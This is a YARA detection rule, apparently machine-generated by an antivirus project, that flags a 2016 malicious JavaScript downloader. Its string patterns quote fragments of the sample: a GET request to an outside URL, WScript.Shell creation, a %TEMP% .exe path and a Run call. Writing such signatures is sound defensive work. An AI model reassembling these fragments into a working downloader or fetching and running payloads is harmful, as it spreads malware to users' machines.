rule sig_20160330_b94849c116b540ecab5e464ddf9f964d {
  meta:
    description = "datamaliciousorder - file 20160330_b94849c116b540ecab5e464ddf9f964d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e1618b403ab4c32f0df4ffa71c381c5e8e5b0d72e21b0fc2c3b45d2dc210bfc6"

  strings:
    $s1  = "JB[QN](\"GET\", \"http://aaacollectionsjewelry.com/x9djsa\", false);" fullword ascii
    $s2  = "var E = function P() {return WScript[TA](\"WScript\"+\".Shell\");}(), R0 = 11;" fullword ascii
    $s3  = "function TN(L0, VC){UA = UA * 1; return L0 - VC;};" fullword ascii
    $s4  = "if (JB[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function CO(){return U0 + \"\";};" fullword ascii
    $s6  = "function KC() {return E[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"C3O5PFXpYyx.ex\" + \"e\";};" fullword ascii
    $s7  = "function C(L){E[\"Run\"](L, UA, UA);};" fullword ascii
    $s8  = "function N() {return ((DS == true) && (DS == SM)) ? 1 : UA;};" fullword ascii
    $s9  = "function Q(){return 22;};" fullword ascii
    $s10 = "function Y(U) {var J = (1, 2, 3, 4, 5, U); return J;};" fullword ascii
    $s11 = "function DC()" fullword ascii
    $s12 = "function PI(){return TA;};" fullword ascii
    $s13 = "}while (B);" fullword ascii
    $s14 = "var RU = new this[\"Date\"]();" fullword ascii
    $s15 = "return TN(C1, H);" fullword ascii
    $s16 = "var DS = false;" fullword ascii
    $s17 = "DS = true; " fullword ascii
    $s18 = "SM = true; " fullword ascii
    $s19 = "var SM = false;" fullword ascii
    $s20 = "var HO = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}